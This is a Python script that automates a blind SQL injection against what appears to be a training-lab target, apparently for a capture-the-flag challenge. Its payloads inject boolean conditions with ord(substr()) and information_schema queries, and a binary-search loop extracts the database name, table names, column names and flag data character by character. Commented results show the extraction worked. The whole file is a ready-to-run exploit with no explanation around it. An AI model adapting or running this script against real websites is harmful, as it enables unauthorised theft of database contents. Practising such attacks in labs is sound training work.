import sys
import time
from requests_html import AsyncHTMLSession, HTMLSession

start_time = time.time()

session = HTMLSession()
proxies = {}

url = 'http://inject2.lab.aqlab.cn:81/Pass-11/index.php?id=0"'
flag_success = '有数据'

payload1_database_length = ' or length(database())={}%23'
payload_database         = ' or ord(substr(database(),{},1))>{}%23'
payload_table            = ' or ord( SUBSTR((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{}%23'
payload_column           = ' or ord( SUBSTR((select group_concat(column_name) from information_schema.columns where table_name="{}"),{},1))>{}%23'
payload_data             = ' or ord( SUBSTR((select group_concat({column_name}) from {table_name}),{},1))>{}%23'


def database_length():
    for i in range(128):
        sql = url + payload1_database_length.format(i)
        res = session.get(sql)
        if flag_success in res.text:
            print('database length = ', i)
            break


def database():
    db = ''
    for i in range(1, 128):
        s = search(i, payload_database)
        if not 32 < ord(s) <= 128:
            break
        db += s
        print('database = ', db)


def search(index, payload):
    low = 32
    high = 128
    mid = (low + high) // 2
    while low < high:
        sql = url + payload.format(index, mid)
        res = session.get(sql)
        if flag_success in res.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

        if mid == 32:
            break
    return chr(mid)


def table():
    db = ''
    for i in range(1, 128):
        s = search(i, payload_table)
        if not 32 < ord(s) <= 128:
            break
        db += s
        print('table = ', db)


def column(table_name):
    db = ''
    for i in range(1, 128):
        s = search(i, payload_column.format(table_name, '{}', '{}'))
        if not 32 < ord(s) <= 128:
            break
        db += s
        print('column = ', db)


def data(column_name, table_name):
    db = ''
    for i in range(1, 128):
        s = search(i, payload_data.format('{}', '{}', column_name=column_name, table_name=table_name))
        if not 32 < ord(s) <= 128:
            break
        db += s
        print('data = ', db)

if __name__ == '__main__':
    # database_length()
    # database()          # 'kanwolongxia'
    # table()             # 'loflag'
    # column('loflag')      # Id,flaglo
    data('flaglo','loflag')      # Id,flaglo
    print("--- %s seconds ---" % (time.time() - start_time))
